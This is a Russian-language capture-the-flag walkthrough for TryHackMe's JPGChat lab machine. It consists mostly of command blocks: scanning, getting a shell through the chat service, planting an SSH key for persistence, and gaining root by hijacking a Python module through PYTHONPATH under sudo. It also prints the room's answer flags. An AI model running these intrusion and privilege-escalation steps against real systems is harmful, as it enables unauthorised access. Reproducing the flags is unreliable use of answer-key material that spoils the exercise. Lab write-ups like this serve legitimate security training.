[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [JPGChat](https://tryhackme.com/r/room/jpgchat) 

Всего 1 заданий:
## Задание 1
Взломайте машину и заберите флаг.

### Ответьте на вопросы ниже
Создайте точку опоры и получите user.txt
```commandline
nmap -sC -sV <IP>
nc <IP> 3000
[REPORT]
https://raw.githubusercontent.com/Mozzie-jpg/JPChat/main/jpchat.py
python3 -c "import pty;pty.spawn('/bin/bash')"
mkdir .ssh
cat > authorized_keys << EOF
> ssh-rsa AAAAB3NzaC1yc2EAAAADAQA[REDACTED]5IKZVtD53kcT6xDO+m7pk= kali@kali       
> EOF
EOF

ssh wes@<IP>
ls -la
cat user.txt
```
```commandline
JPC{487030410a543503cbb59ece16178318}
```

Повысьте свои привилегии до root и прочитайте root.txt
```commandline
sudo -l
ls -l /opt/development/test_module.py
cat > compare.py << EOF
> import os
> os.system('/bin/bash')
> EOF

chmod +x compare.py
export PYTHONPATH=/home/wes
sudo /usr/bin/python3 /opt/development/test_module.py
cat /root/root.txt
```
```commandline
JPC{665b7f2e59cf44763e5a7f070b081b0a}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)